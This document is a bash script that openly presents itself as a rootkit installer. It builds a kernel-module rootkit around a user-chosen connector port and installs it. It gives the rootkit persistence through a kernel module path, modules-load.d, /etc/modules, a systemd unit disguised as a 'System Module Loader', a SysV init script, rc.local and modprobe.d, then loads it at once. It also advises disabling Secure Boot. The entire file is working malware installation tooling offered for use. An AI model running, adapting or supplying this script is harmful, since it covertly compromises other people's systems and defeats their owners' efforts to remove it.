#!/bin/bash

# Enhanced Rootkit Installer with Multiple Persistence Mechanisms

set -e

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "[-] Please run as root"
    exit 1
fi

# Prompt for port number
read -p "Enter the connector port number: " PORT_NUMBER
if [ -z "$PORT_NUMBER" ]; then
    echo "[-] Port number is required"
    exit 1
fi

# Validate port number
if ! [[ "$PORT_NUMBER" =~ ^[0-9]+$ ]] || [ "$PORT_NUMBER" -lt 1 ] || [ "$PORT_NUMBER" -gt 65535 ]; then
    echo "[-] Invalid port number. Must be between 1 and 65535"
    exit 1
fi

echo "[+] Using port: $PORT_NUMBER"

# Update config
sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config.yml

# Build rootkit
echo "[+] Building rootkit..."
python3 builder.py -c rootkit_files/config.yml -o

# Get rootkit name
if [ -z "$1" ]; then
    read -p "Enter rootkit name: " ROOTKIT_NAME
    if [ -z "$ROOTKIT_NAME" ]; then
        echo "[-] Rootkit name is required"
        exit 1
    fi
else
    ROOTKIT_NAME="$1"
fi

KERNEL_VERSION=$(uname -r)
MODULE_PATH="/lib/modules/${KERNEL_VERSION}/kernel/drivers/misc"
MODULE_CONF="/etc/modules-load.d/${ROOTKIT_NAME}.conf"
MODULE_KO="${ROOTKIT_NAME}.ko"

# Verify build output
if [ ! -f "$MODULE_KO" ]; then
    echo "[-] Build failed: ${MODULE_KO} not found"
    exit 1
fi

echo "[+] Installing rootkit with enhanced persistence..."

# Method 1: Standard module installation
echo "[+] Installing to: $MODULE_PATH"
mkdir -p "$MODULE_PATH"
cp "$MODULE_KO" "$MODULE_PATH/"
chmod 644 "$MODULE_PATH/$MODULE_KO"

# Update module index
echo "[+] Running depmod..."
depmod -a

# Method 2: modules-load.d configuration
echo "[+] Creating auto-load config at $MODULE_CONF"
echo "$ROOTKIT_NAME" > "$MODULE_CONF"

# Method 3: Add to /etc/modules (for older systems)
if [ -f "/etc/modules" ]; then
    if ! grep -q "^$ROOTKIT_NAME$" /etc/modules; then
        echo "[+] Adding to /etc/modules"
        echo "$ROOTKIT_NAME" >> /etc/modules
    fi
fi

# Method 4: Create systemd service for additional persistence
SYSTEMD_SERVICE="/etc/systemd/system/${ROOTKIT_NAME}-loader.service"
echo "[+] Creating systemd service: $SYSTEMD_SERVICE"
cat > "$SYSTEMD_SERVICE" << EOF
[Unit]
Description=System Module Loader for $ROOTKIT_NAME
After=multi-user.target
Wants=multi-user.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe $ROOTKIT_NAME
ExecStop=/sbin/rmmod $ROOTKIT_NAME
RemainAfterExit=yes
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Enable the systemd service
echo "[+] Enabling systemd service..."
systemctl daemon-reload
systemctl enable "${ROOTKIT_NAME}-loader.service"

# Method 5: Create init script for SysV systems
INIT_SCRIPT="/etc/init.d/${ROOTKIT_NAME}-loader"
if [ -d "/etc/init.d" ] && [ ! -f "$INIT_SCRIPT" ]; then
    echo "[+] Creating SysV init script: $INIT_SCRIPT"
    cat > "$INIT_SCRIPT" << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          $ROOTKIT_NAME-loader
# Required-Start:    \$local_fs \$network
# Required-Stop:     \$local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Load $ROOTKIT_NAME module
### END INIT INFO

case "\$1" in
    start)
        echo "Loading $ROOTKIT_NAME module..."
        /sbin/modprobe $ROOTKIT_NAME
        ;;
    stop)
        echo "Unloading $ROOTKIT_NAME module..."
        /sbin/rmmod $ROOTKIT_NAME 2>/dev/null || true
        ;;
    restart)
        \$0 stop
        \$0 start
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        exit 1
        ;;
esac
exit 0
EOF
    chmod +x "$INIT_SCRIPT"
    
    # Enable for different runlevels
    if command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d "${ROOTKIT_NAME}-loader" defaults
    elif command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add "${ROOTKIT_NAME}-loader"
        chkconfig "${ROOTKIT_NAME}-loader" on
    fi
fi

# Method 6: Add to rc.local as fallback
RC_LOCAL="/etc/rc.local"
if [ -f "$RC_LOCAL" ]; then
    if ! grep -q "modprobe $ROOTKIT_NAME" "$RC_LOCAL"; then
        echo "[+] Adding to rc.local as fallback"
        # Insert before exit 0 if it exists, otherwise append
        if grep -q "exit 0" "$RC_LOCAL"; then
            sed -i "/exit 0/i /sbin/modprobe $ROOTKIT_NAME 2>/dev/null || true" "$RC_LOCAL"
        else
            echo "/sbin/modprobe $ROOTKIT_NAME 2>/dev/null || true" >> "$RC_LOCAL"
        fi
        chmod +x "$RC_LOCAL"
    fi
fi

# Method 7: Cron job monitoring (DISABLED by user preference)
# CRON_JOB="/etc/cron.d/${ROOTKIT_NAME}-keeper"
# echo "[+] Skipping cron job creation (disabled by user preference)"

# Method 8: Create module configuration to handle dependencies
MODPROBE_CONF="/etc/modprobe.d/${ROOTKIT_NAME}.conf"
echo "[+] Creating modprobe configuration: $MODPROBE_CONF"
cat > "$MODPROBE_CONF" << EOF
# Configuration for $ROOTKIT_NAME module
install $ROOTKIT_NAME /sbin/modprobe --ignore-install $ROOTKIT_NAME
EOF

# Load module now
echo "[+] Loading module using modprobe..."
modprobe "$ROOTKIT_NAME"

# Verify success
if lsmod | grep -q "$ROOTKIT_NAME"; then
    echo "[✓] Rootkit '${ROOTKIT_NAME}' successfully installed with enhanced persistence"
else
    echo "[✗] Module did not load. Check 'dmesg' for kernel errors"
    exit 1
fi

echo ""
echo "Enhanced Installation Summary:"
echo "- Installed module: $MODULE_PATH/$MODULE_KO"
echo "- Auto-load config: $MODULE_CONF"
echo "- Systemd service: $SYSTEMD_SERVICE (enabled)"
echo "- Modprobe config: $MODPROBE_CONF"
echo "- Cron monitor: Disabled (by user preference)"
if [ -f "$INIT_SCRIPT" ]; then
    echo "- SysV init script: $INIT_SCRIPT (enabled)"
fi
if grep -q "modprobe $ROOTKIT_NAME" "$RC_LOCAL" 2>/dev/null; then
    echo "- rc.local entry: Added"
fi
echo "- Status: $(lsmod | grep "$ROOTKIT_NAME" | awk '{print $1 " (loaded)"}')"
echo ""
echo "[+] Multiple persistence mechanisms installed. Module should survive:"
echo "    - System reboots"
echo "    - Service restarts"
echo "    - Manual module removal (partial protection)"
echo ""
echo "[!] Note: On systems with Secure Boot, you may need to:"
echo "    - Disable Secure Boot, or"
echo "    - Sign the module with a trusted key"
